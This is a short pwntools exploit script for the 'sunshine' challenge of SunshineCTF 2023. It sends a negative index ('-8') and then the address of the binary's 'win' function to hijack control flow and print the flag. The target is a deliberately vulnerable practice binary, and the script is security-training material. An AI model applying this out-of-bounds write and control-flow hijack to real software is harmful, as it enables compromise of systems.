#!/usr/bin/env python

from pwn import *

elf = ELF("./sunshine", checksec=False)

if args.REMOTE:
    p = remote('chal.2023.sunshinectf.games',23003)
else:
    p = elf.process()

context.binary = elf

win_addr = elf.symbols['win']

amt = '-8'
p.recvuntil(b'>>>')
p.sendline(amt.encode())
p.recvline()
p.sendline(p64(win_addr))

#print(p.recvall())
resp = p.recvline().decode().strip()
#print('\nRESP: {}\n'.format(resp))

success("\n\n\nFLAG: {}\n\n\n\n".format(resp))

